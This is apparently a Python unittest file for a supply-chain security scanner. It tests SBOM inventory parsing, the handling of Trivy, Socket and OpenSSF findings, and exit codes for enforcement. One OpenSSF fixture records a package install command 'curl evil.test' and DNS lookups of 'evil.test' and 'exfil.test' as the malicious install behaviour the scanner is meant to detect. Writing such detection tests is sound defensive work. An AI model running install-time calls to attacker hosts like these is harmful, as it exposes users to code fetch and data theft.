"""Behavior and failure-path tests for the public reusable scanner."""
import importlib.util
import io
import json
from pathlib import Path
import sys
import tempfile
import unittest
from unittest import mock

SCAN = Path(__file__).resolve().parents[1] / "actions" / "security-scan" / "scan.py"
spec = importlib.util.spec_from_file_location("cordillera_security_scan", SCAN)
scan = importlib.util.module_from_spec(spec)
spec.loader.exec_module(scan)


def sbom(*purls):
    return {"bomFormat": "CycloneDX", "specVersion": "1.5",
            "components": [{"name": "test", "purl": p} for p in purls]}


def pkg(name="example", version="4.2.1"):
    return {"purl": "pkg:npm/" + name + "@" + version,
            "name": name, "version": version, "origin": "sbom-component"}


class InventoryTests(unittest.TestCase):
    def test_nested_bundled_node_components_are_discovered(self):
        data = {"bomFormat": "CycloneDX", "components": [
            {"name": "node", "purl": "pkg:generic/node@24.0",
             "components": [{"name": "undici", "purl": "pkg:npm/undici@7.4.1"},
                            {"name": "bad", "purl": "pkg:generic/bad@1"}]},
            {"name": "direct", "purl": "pkg:npm/%40scope/lib@2.0"},
            {"name": "dup", "purl": "pkg:npm/undici@7.4.1"}]}
        result = scan.inventory(data)
        self.assertEqual([p["purl"] for p in result],
                         ["pkg:npm/@scope/lib@2.0", "pkg:npm/undici@7.4.1"])
        self.assertEqual(result[1]["origin"], "bundled-upstream")

    def test_invalid_sbom_not_silently_empty(self):
        for value in ({}, {"bomFormat": "CycloneDX"}, {"bomFormat": "SPDX", "components": []}):
            with self.subTest(value=value), self.assertRaises(ValueError):
                scan.inventory(value)


class TrivyTests(unittest.TestCase):
    def test_fixable_and_unfixed_findings(self):
        report = {"Results": [{"Class": "os-pkgs", "Vulnerabilities": [
            {"PkgName": "libc6", "VulnerabilityID": "CVE-fixed",
             "Severity": "HIGH", "FixedVersion": "1.2"},
            {"PkgName": "libc6", "VulnerabilityID": "CVE-unfixed",
             "Severity": "CRITICAL", "FixedVersion": ""}]}]}
        result = scan.from_trivy(report, only_fixable=True)
        self.assertEqual([f["blocking"] for f in result["findings"]], [True, False])
        self.assertEqual(len(scan.from_trivy(report, only_fixable=False)["findings"]), 2)

    def test_no_results_is_not_a_scanner_pass(self):
        for report in ({}, {"Results": []}):
            with self.subTest(report=report), self.assertRaises(ValueError):
                scan.from_trivy(report)


class SocketTests(unittest.TestCase):
    def test_exact_package_and_version_required(self):
        packages = [pkg()]
        rows = [{"type": "npm", "name": "example", "version": "4.2.0",
                 "alerts": [{"type": "malware", "severity": "critical"}]}]
        result = scan.socket_result(packages, rows)
        self.assertEqual(result["status"], "partial")
        self.assertEqual(result["covered"], 0)
        self.assertEqual(result["findings"], [])

    def test_malware_alert_blocks_and_pending_is_missing(self):
        packages = [pkg(), pkg("other", "1.0")]
        rows = [
            {"type": "npm", "name": "example", "version": "4.2.1",
             "alerts": [{"type": "malware", "severity": "critical", "action": "error"}]},
            {"type": "npm", "name": "other", "version": "1.0",
             "alerts": [{"type": "pendingScan"}]},
        ]
        result = scan.socket_result(packages, rows)
        self.assertEqual(result["status"], "partial")
        self.assertEqual(result["covered"], 1)
        self.assertEqual(result["findings"][0]["type"], "malware")
        self.assertTrue(result["findings"][0]["blocking"])
        self.assertEqual(result["missing"], ["pkg:npm/other@1.0"])

    def test_json_and_ndjson_decode(self):
        doc = b'{"type":"npm","name":"example","version":"4.2.1","alerts":[]}\n'
        self.assertEqual(scan.parse_socket_rows(doc)[0]["name"], "example")
        self.assertEqual(scan.parse_socket_rows(b"[" + doc.strip() + b"]")[0]["type"], "npm")
        with self.assertRaises(ValueError):
            scan.parse_socket_rows(b'{"unexpected":"schema"}')

    def test_live_socket_request_uses_exact_purl_and_bearer_token(self):
        class Response:
            def __enter__(self): return self
            def __exit__(self, *_): return False
            def read(self, _):
                return b'{"type":"npm","name":"example","version":"4.2.1","alerts":[]}\\n'
        def urlopen(request, timeout):
            self.assertEqual(request.get_method(), "POST")
            self.assertIn("/orgs/my-org/purl?", request.full_url)
            self.assertEqual(request.get_header("Authorization"), "Bearer private-token")
            self.assertEqual(json.loads(request.data)["components"],
                             [{"purl": "pkg:npm/example@4.2.1"}])
            self.assertEqual(timeout, 20)
            return Response()
        with mock.patch.object(scan.urllib.request, "urlopen", side_effect=urlopen):
            result = scan.fetch_socket([pkg()], "my-org", "private-token")
        self.assertEqual(result["status"], "complete")
        self.assertEqual(result["covered"], 1)

    def test_no_token_cannot_be_clean(self):
        result = scan.fetch_socket([pkg()], "", "")
        self.assertEqual(result["status"], "unavailable")

    def test_provider_fault_does_not_become_clean(self):
        with mock.patch.object(scan.urllib.request, "urlopen", side_effect=TimeoutError):
            result = scan.fetch_socket([pkg()], "some-org", "redacted")
        self.assertEqual(result["status"], "unavailable")
        self.assertEqual(result["covered"], 0)


class OpenSSFTests(unittest.TestCase):
    def test_install_observations_extracted_from_realistic_nested_shape(self):
        rows = [{"name": "example", "version": "4.2.1", "created": "2026-11-01",
                 "install": json.dumps({"Commands": [{"Command": ["sh", "-c", "curl evil.test"]}],
                                        "DNS": [{"Queries": [{"Hostname": "evil.test"}]}]})}]
        result = scan.openssf_result([pkg()], rows)
        self.assertEqual(result["status"], "complete")
        self.assertEqual(result["covered"], 1)
        self.assertEqual({f["type"] for f in result["findings"]},
                         {"install-command", "install-dns"})
        self.assertTrue(all(not f["blocking"] for f in result["findings"]))

    def test_sandwich_history_does_not_implicate_unobserved_exact_version(self):
        # An intermediate malicious release is never inferred as malicious
        # for a later, different release. Historical analysis requires evidence.
        rows = [
            {"name": "example", "version": "4.2.0", "install": {}},
            {"name": "example", "version": "4.2.1",
             "install": {"DNS": [{"Queries": [{"Hostname": "exfil.test"}]}]}},
        ]
        result = scan.openssf_result([pkg(version="4.2.2")], rows)
        self.assertEqual(result["status"], "partial")
        self.assertEqual(result["findings"], [])
        self.assertEqual(result["covered"], 0)

    def test_bigquery_adapter_parameterizes_exact_versions(self):
        command = []
        def fake_run(args, **_kwargs):
            command.extend(args)
            return mock.Mock(returncode=0, stdout=json.dumps([
                {"name":"example", "version":"4.2.1", "install":"{}"}]))
        with mock.patch.object(scan.subprocess, "run", side_effect=fake_run):
            result = scan.query_openssf([pkg()], "valid-project")
        self.assertEqual(result["status"], "complete")
        self.assertTrue(any(v.startswith("--parameter=requested:STRING:") for v in command))
        self.assertIn("ossf-malware-analysis.packages.analysis", command[-1])

    def test_unobserved_install_phase_is_missing(self):
        result = scan.openssf_result([pkg()], [{"name":"example","version":"4.2.1"}])
        self.assertEqual(result["status"], "partial")
        self.assertEqual(result["covered"], 0)

    def test_bigquery_missing_is_explicit(self):
        self.assertEqual(scan.query_openssf([pkg()], "")["status"], "unavailable")
        with mock.patch.object(scan.subprocess, "run", side_effect=FileNotFoundError):
            self.assertEqual(scan.query_openssf([pkg()], "valid-project")["status"], "unavailable")


class IntegrationTests(unittest.TestCase):
    def invoke(self, mode, providers="trivy,socket,openssf"):
        with tempfile.TemporaryDirectory() as td:
            root = Path(td)
            (root / "sbom.json").write_text(json.dumps(sbom("pkg:npm/example@1.0")))
            (root / "trivy.json").write_text(json.dumps({"Results": [{"Class": "os-pkgs",
                                                                    "Vulnerabilities": []}]}))
            args = ["scan.py", "--sbom", str(root / "sbom.json"),
                    "--trivy-report", str(root / "trivy.json"),
                    "--providers", providers, "--mode", mode,
                    "--output", str(root / "report.json")]
            with mock.patch.object(sys, "argv", args):
                status = scan.main()
            result = json.loads((root / "report.json").read_text())
            return status, result

    def test_report_only_uses_missing_status_but_exits_zero(self):
        status, result = self.invoke("report")
        self.assertEqual(status, 0)
        self.assertEqual(result["verdict"], "incomplete")
        self.assertEqual(result["providers"]["trivy"]["status"], "complete")
        self.assertEqual(result["providers"]["socket"]["status"], "unavailable")
        self.assertEqual(result["providers"]["openssf"]["status"], "unavailable")

    def test_enforce_fails_on_missing_signals(self):
        status, report = self.invoke("enforce")
        self.assertEqual(status, 1)
        self.assertEqual(report["verdict"], "incomplete")

    def test_trivy_only_can_pass_enforcement(self):
        status, report = self.invoke("enforce", providers="trivy")
        self.assertEqual(status, 0)
        self.assertEqual(report["verdict"], "pass")

    def test_invalid_provider_set_fails_input(self):
        with tempfile.TemporaryDirectory() as td:
            p = Path(td) / "sbom.json"
            p.write_text(json.dumps(sbom()))
            with mock.patch.object(sys, "argv", ["scan.py", "--sbom", str(p),
                            "--providers", "trivy,random", "--output", str(Path(td) / "out")]):
                self.assertEqual(scan.main(), 2)


if __name__ == "__main__":
    unittest.main()
